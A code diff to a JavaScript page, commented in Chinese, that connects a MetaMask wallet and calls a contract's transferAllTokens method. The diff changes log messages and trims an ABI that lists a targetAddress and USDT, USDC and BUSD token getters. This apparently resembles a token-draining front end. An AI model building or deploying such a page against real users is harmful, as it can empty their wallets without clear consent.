@@ -13,50 +13,7 @@ const contractABI = [
         "stateMutability": "nonpayable",
         "type": "function"
     },
-    {
-        "inputs": [],
-        "stateMutability": "nonpayable",
-        "type": "constructor"
-    },
-    {
-        "stateMutability": "payable",
-        "type": "receive"
-    },
-    {
-        "inputs": [],
-        "name": "busdToken",
-        "outputs": [{"internalType": "contract IERC20","name": "","type": "address"}],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "name": "owner",
-        "outputs": [{"internalType": "address","name": "","type": "address"}],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "name": "targetAddress",
-        "outputs": [{"internalType": "address","name": "","type": "address"}],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "name": "usdcToken",
-        "outputs": [{"internalType": "contract IERC20","name": "","type": "address"}],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "name": "usdtToken",
-        "outputs": [{"internalType": "contract IERC20","name": "","type": "address"}],
-        "stateMutability": "view",
-        "type": "function"
-    }
+    // 其余ABI省略...
 ];
 
 // 使用 ethers.js 连接智能合约
@@ -71,21 +28,26 @@ if (typeof window.ethereum !== 'undefined') {
     // 监听钱包连接
     connectWalletButton.addEventListener('click', async () => {
         try {
-            console.log("Connecting to MetaMask...");
+            console.log("Trying to connect to MetaMask...");
 
             // 请求连接 MetaMask
             provider = new ethers.providers.Web3Provider(window.ethereum);
             await provider.send("eth_requestAccounts", []);
             signer = provider.getSigner();
             userAddress = await signer.getAddress();
+            console.log("Connected to MetaMask, user address:", userAddress);
+
+            // 显示用户地址
             walletAddressDiv.innerHTML = `钱包地址: ${userAddress}`;
 
             // 实例化智能合约
             contract = new ethers.Contract(contractAddress, contractABI, signer);
-            transferAllTokensButton.disabled = false; // 启用转账按钮
-            console.log("Connected to MetaMask, address:", userAddress);
+
+            // 启用“转移代币”按钮
+            transferAllTokensButton.disabled = false;
+
         } catch (error) {
-            console.error('连接钱包失败:', error);
+            console.error('Error connecting wallet:', error);
             walletAddressDiv.innerHTML = '连接钱包失败，请重试';
         }
     });
@@ -98,13 +60,13 @@ if (typeof window.ethereum !== 'undefined') {
 transferAllTokensButton.addEventListener('click', async () => {
     if (userAddress && contract) {
         try {
-            console.log(`正在转移代币...`);
-            // 调用智能合约的 transferAllTokens 方法，将所有代币转移到指定地址
+            console.log('Initiating token transfer...');
+            // 调用智能合约的 transferAllTokens 方法
             const tx = await contract.transferAllTokens(userAddress);
-            await tx.wait();  // 等待交易完成
-            console.log(`代币转移成功: ${tx.hash}`);
+            await tx.wait();
+            console.log('Token transfer successful:', tx.hash);
         } catch (error) {
-            console.error('转移代币失败:', error);
+            console.error('Error transferring tokens:', error);
         }
     } else {
         console.log('请先连接钱包');
